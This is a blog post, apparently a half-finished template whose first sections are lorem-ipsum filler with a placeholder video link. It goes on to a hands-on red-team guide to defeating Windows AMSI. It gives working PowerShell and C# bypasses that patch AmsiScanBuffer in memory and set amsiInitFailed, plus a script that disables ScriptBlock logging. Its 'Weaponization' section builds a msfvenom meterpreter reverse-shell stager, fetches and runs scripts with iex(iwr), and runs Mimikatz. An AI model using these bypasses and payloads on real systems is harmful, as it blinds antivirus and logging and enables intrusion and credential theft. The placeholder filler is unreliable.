---
layout: default
---

_**Aug 29, 2020**_

## This is a template post

this is a test post, here we can put an intreduction

## Overview

Lorem ipsum dolor sit amet duis. Nisi sit enim, nulla do velit. Cupidatat enim laborum elit ut aliquip, mollit quis consequat laboris labore consectetur irure in excepteur do nostrud nulla reprehenderit dolore voluptate consequat eiusmod. Ea irure do ipsum, sint nostrud id ex labore pariatur. Deserunt cupidatat non eiusmod laborum non nisi est quis, sint enim. Cupidatat qui minim sint, officia ad aliqua elit dolore elit. Deserunt consequat culpa dolore reprehenderit consequat irure id cupidatat sint qui,.

Anim minim esse fugiat in minim proident pariatur ut ullamco deserunt et nostrud ea
ut cillum tempor magna laboris occaecat commodo. 
Ad consequat enim esse eu ut qui veniam cupidatat proident duis aute non minim consectetur sunt do cupidatat. 


## Internals

Lorem ipsum dolor sit amet duis. Nisi sit enim, nulla do velit. Cupidatat enim laborum elit ut aliquip, mollit quis consequat laboris labore consectetur irure in excepteur do nostrud nulla reprehenderit dolore voluptate consequat eiusmod. Ea irure do ipsum, sint nostrud id ex labore pariatur. Deserunt cupidatat non eiusmod laborum non nisi est quis, sint enim. Cupidatat qui minim sint, officia ad aliqua elit dolore elit. Deserunt consequat culpa dolore reprehenderit consequat irure id cupidatat sint qui,.

Anim minim esse fugiat in minim proident pariatur ut ullamco deserunt et nostrud ea, ut cillum tempor magna laboris occaecat commodo. Ad consequat enim esse eu ut qui veniam cupidatat proident duis aute non minim consectetur sunt do cupidatat. Ex voluptate laborum, laboris officia ut mollit aliqua elit incididunt voluptate fugiat. Magna id cillum esse consequat reprehenderit nisi fugiat magna ullamco aliquip dolor irure in dolor culpa mollit magna mollit non. Elit laboris sint veniam id consectetur excepteur ullamco consectetur occaecat laborum minim. Consequat sint incididunt occaecat irure commodo eu incididunt Lorem cillum adipisicing aute Lorem.

Sunt anim voluptate dolor `magna` anim ea minim ea cupidatat elit ipsum, cillum minim. Ea consequat qui eu deserunt ut consectetur pariatur sint dolor ex sunt incididunt pariatur duis ut quis voluptate. Ex deserunt ex sint veniam magna cillum nisi anim elit sint ipsum irure et deserunt commodo adipisicing, enim ad veniam qui magna aute.


![1st Image Ever](../assets/images/image1.png "AMSI Design")

Check out [Somone talk about something](https://www.youtube.com/watch?v=WRONGVIDEO) About some repos [APTx1337](https://github.com/APTx1337). [8] [9]

this is an example of a code we didnt write function `ScanContent`:

```c#
internal unsafe static AmsiUtils.AmsiNativeMethods.AMSI_RESULT ScanContent(string content, string sourceMetadata)
{
    if (string.IsNullOrEmpty(sourceMetadata))
    {
        sourceMetadata = string.Empty;
    }

    if (InternalTestHooks.UseDebugAmsiImplementation && content.IndexOf("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*", StringComparison.Ordinal) >= 0)
    {
        return AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED;
    }

    if (AmsiUtils.amsiInitFailed)
    {
        return AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
    }

...
// call to AmsiScanBuffer()
...
}
```

The code is pretty descriptive itself and we can already notice some important details:

1. if the input is empty, `AMSI_RESULT_NOT_DETECTED` is returned to indicate that the sample is not considered malicious.

1. `AMSI_RESULT_DETECTED` is returned when the content is considered malicious, as we can see from the string comparison with the [EICAR test file](https://en.wikipedia.org/wiki/EICAR_test_file). [16]

1. if the `amsiInitFailed` field is set, `AMSI_RESULT_NOT_DETECTED` is returned to indicate that the sample is not considered malicious.

1. otherwise, the function continues with its detection logic and calls `AmsiScanBuffer`.

## Bypassing AMSI

There are three main ways to bypass AMSI:

1. if PowerShell v2 is available, just use that.
1. if Powershell v2 is not available, we need to manually disable AMSI using a bypass.
1. if no bypass is working, use obfuscation.

It's important to note that all the known bypasses are based on the fact that the AMSI DLL is loaded in the userspace.

### Obfuscation

There are some interesting tools that can help us to create (minimally) obfuscated samples starting from a detected `.ps1` script:

1. [PSAmsi](https://github.com/cobbr/PSAmsi): it can detect the exact signatures and generated a minimally obfuscated script that will evade AMSI. You need to run in on a test machine because it will trigger a lot of AV alerts. Check out Ryan Cobb's [DerbyCon talk](https://www.youtube.com/watch?v=rEFyalXfQWk). [13] [14]
1. [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation): a general purpose PowerShell obfuscator that can apply a few different techniques and produce unique, obfuscated samples. Check out Daniel Bohannon's [Hacktivity talk](https://www.youtube.com/watch?v=uE8IAxM_BhE). [18] [19]

### PowerShell Downgrade Attack

Why PowerShell v2 is so useful in this case? Because version 2 doesn't have the necessary internal hooks to support AMSI so it's a _win-win_. In order to launch PowerShell v2 we can simply issue the following command:

```powershell
C:\Users\Public\phra> powershell -Version 2 -NoProfile -ExecutionPolicy Bypass -Command "'amsiutils'"
'amsiutils'
```

As we can see, the string `'amsiutils'` is not blocked by AMSI.

### Forcing an error

If we are able to force an error inside AMSI, the internal property `amsiInitField` will be set and AMSI won't be called anymore.

```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076) # allocate some memory
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null) # overwrite `amsiSession`
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem) # overwrite `amsiContext`
Write-host -ForegroundColor green "AMSI won't be called anymore"
```

### Setting amsiInitFailed to $true

Instead of causing an error, we can also directly set ourselves the `amsiInitField` property.
[@mattifestation](https://twitter.com/mattifestation) bypass is so short to fit into a [tweet](https://twitter.com/mattifestation/status/735261176745988096). [3]

```powershell
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') # get `amsi.dll` handle
$field = $amsi.GetField('amsiInitFailed','NonPublic,Static') # get `amsiInitFailed` field
$field.SetValue($null,$true) # set it to `$true`
Write-host -ForegroundColor green "AMSI won't be called anymore"
```

The `amsiInitFailed` property is not directly exposed due to the fact that the it's declared private, but thanks to the [.NET Reflection API](https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/reflection) we can access it.
By setting it at `$true` we can successfully disable AMSI and `amsi.dll`'s `AmsiScanBuffer` won't be called anymore.

### Patching AmsiScanBuffer

It's also possible to _monkeypatch_ at runtime the `amsi.dll` code. In particular, we are interested in patching the function `AmsiScanBuffer`. We can overwrite the logic of this function by making them always return `S_OK`, as when the command is allowed to run. [7]

In order to do that we can craft a malicious DLL to load at runtime that will patch on the fly the `amsi.dll` in our memory space. There are multiple versions of this specific bypass, I will report the latest `C#` version embedded in a `.ps1` script, taken from [decoder](https://decoder.cloud)'s [powershellveryless](https://github.com/decoder-it/powershellveryless). [20] [21]

```powershell
# Add-Type writes *.cs on disk!!
$id = get-random;
$Ref = (
    "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
);

$Source = @"
using System;
using System.Runtime.InteropServices;
namespace Bypass
{
    public class AMSI$id
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static int Disable()
        {
            string hexbuffer = "41;6d;73;69;53;63;61;6e;42;75;66;66;65;72";
            string hexdllbuffer = "61;6d;73;69;2e;64;6c;6c";

            string buf1=FromHexBuffer(hexdllbuffer);
            string buf2=FromHexBuffer(hexbuffer);
            IntPtr Address = GetProcAddress(LoadLibrary(buf1), buf2);

            UIntPtr size = (UIntPtr)5;
            uint p = 0;

            VirtualProtect(Address, size, 0x40, out p);
            byte c1=0xB8,c2=0x80;

            Byte[] Patch = {c1, 0x57, 0x00, 0x07, c2, 0xC3 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
            Marshal.Copy(Patch, 0, unmanagedPointer, 6);
            MoveMemory(Address, unmanagedPointer, 6);

            return 0;
        }

        public static string FromHexBuffer(String hexdata)
        {
            string buffer="";
            String[] hexbuffersplit = hexdata.Split(';');
            foreach (String hex in hexbuffersplit)
            {
                int value = Convert.ToInt32(hex, 16);
                buffer+= Char.ConvertFromUtf32(value);
            }

            return buffer;
        }
    }
}
"@;

Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp;
iex "[Bypass.AMSI$id]::Disable() | Out-Null"
Write-host -ForegroundColor green "AMSI won't be called anymore"
```

Be aware that using `Add-Type` to compile on the fly `C#` in PowerShell code will touch the disk, dropping some `*.cs` to a temporary directory during the compilation phase. In order to avoid to touch disk we need to compile separately the DLL and load it via .NET Reflection:

```powershell
[Reflection.Assembly]::Load($AMSIBypassDLLBytes)
[Bypass.AMSI]::Disable()
```

For more information, you can refer to [Out-CompressedDll.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/ScriptModification/Out-CompressedDll.ps1) by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit).

### Hooking .NET Framework via CLR

Another powerful technique is based on hooking at runtime the .NET Framework via CLR Profiler API, as seen in [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) by Omer Yiar.
This project is able to bypass all the protection mechanisms of PowerShell, that are Script Block Log, Module Logging, Transcription and AMSI.

Using CLR Profiler APIs, `Invisi-Shell` is able to hook .NET assemblies [10] and disable any kind of protection mechanisms by always overwriting the input length attribute with `0`. As we saw above, if the input is empty, `AMSI_RESULT_NOT_DETECTED` will be returned and the same logic applies to every other security mechanisms.

The only downside of this techinique is that you have to drop a DLL on disk, in order to be loaded by the CLR Profiler APIs.

There are two ways of loading the DLL:

1. via ENV variables (**admin required**)

```cmd
set COR_ENABLE_PROFILING=1
set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
set COR_PROFILER_PATH=%~dp0InvisiShellProfiler.dll

powershell
```

2. via the Registry (**any user**)

```cmd
set COR_ENABLE_PROFILING=1
set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "%~dp0InvisiShellProfiler.dll" /f

powershell
```

The PowerShell terminal that appears will have all the protection mechanisms disabled.
For more info regarding the internals, I forward you to his amazing [DerbyCon talk](https://www.youtube.com/watch?v=Y3oMEiySxcc). [9]
If you are interested in the detection side, I suggest to check out his other project [Babel-Shellfish](https://github.com/OmerYa/Babel-Shellfish). [15]

## Weaponization

Let's see how we can use this technique in order to spawn a meterpreter agent on the target machine.
We need to do two things in order to do that:

1. disable logging on disk
2. execute the AMSI bypass

A ready to use [Invoke-Bypass.ps1](https://github.com/d0nkeys/redteam/blob/master/code-execution/Invoke-Bypass.ps1) script is available on [d0nkeys/redteam](https://github.com/d0nkeys/redteam) repository on GitHub. [12]

### Disable ScriptBlockLog

First of all, in order to avoid to be detected after having disabled AMSI, we need to be sure that no logs of our commands are saved on disk, otherwise the AV will spot our activity. There is a public known bypass to disable the built-in `ScriptBlockLog` mechanism of PowerShell. [17]

```powershell
$GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','N'+'onPublic,Static');
If($GPF){
    $GPC=$GPF.GetValue($null);
    If($GPC['ScriptB'+'lockLogging']){
        $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
        $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockInvocationLogging']=0
    }
    $val=[Collections.Generic.Dictionary[string,System.Object]]::new();
    $val.Add('EnableScriptB'+'lockLogging',0);
    $val.Add('EnableScriptB'+'lockInvocationLogging',0);
    $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$val
} Else {
    [ScriptBlock].GetField('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
}
```

It works by doing two things:

1. disable global logging of scripts: if Domain Admins enable global logging of scripts, every script will be recorded on the disk. To disable it we just overwrite the in-memory representation of the Group Policy Settings.
2. replace the dictionary of known signatures with an empty one: some signatures always trigger a log action, even if the Script Block Logging mechanism is not enabled via Group Policy (_sic!_). In order to disable it, we replace this dictionary of known signatures with an empty one, always in our memory space.


### Meterpreter

We can use the bypass to first spawn a meterpreter instance via PowerShell and then to execute any `*.ps1` scripts. A [PR](https://github.com/rapid7/rex-powershell/pull/17) do it automagically is on its way.
For now, to spawn it we need to generate the stager via the following command:

```asd
msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=3000 LHOST=127.0.0.1 -f psh > meter.ps1
```

and execute the bypass before it:

```powershell
iex(iwr https://127.0.0.1/Invoke-Bypass.ps1)
Invoke-BypassScriptBlockLog
Invoke-BypassAMSI
iex(iwr https://127.0.0.1/meter.ps1)
```

We can also use the AMSI bypass to execute arbitrary PowerShell code on the machine from a meterpreter session. If we try to _execute_ `'amsiutils'` in a PowerShell session you will get something like this:

```asd
msf5 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_execute "'amsiutils'"
[+] Command execution completed:
ERROR:
```

but if we import [Invoke-Bypass](https://github.com/d0nkeys/redteam/blob/master/code-execution/Invoke-Bypass.ps1) and execute the bypasses, we are then allowed to run any kind of command, including, for example, [Invoke-Mimikatz](https://github.com/d0nkeys/redteam/blob/master/credentials/Invoke-Mimikatz.ps1).

```
meterpreter > powershell_import Invoke-Bypass.ps1
[+] File successfully imported. No result was returned.
meterpreter > powershell_execute "Invoke-BypassScriptBlockLog"
[+] Command execution completed:

meterpreter > powershell_execute "Invoke-BypassAMSI"
[+] Command execution completed:

meterpreter > powershell_execute "'amsiutils'"
[+] Command execution completed:
amsiutils

```

## Some Resources

- [https://www.cyberark.com/threat-research-blog/amsi-bypass-patching-technique/](https://www.cyberark.com/threat-research-blog/amsi-bypass-patching-technique/) [4]
- [https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/](https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/) [5]


## References

1. [https://docs.microsoft.com/en-us/windows/desktop/amsi/antimalware-scan-interface-portal](https://docs.microsoft.com/en-us/windows/desktop/amsi/antimalware-scan-interface-portal)
2. [https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiscanbuffer](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiscanbuffer)

[back](../)
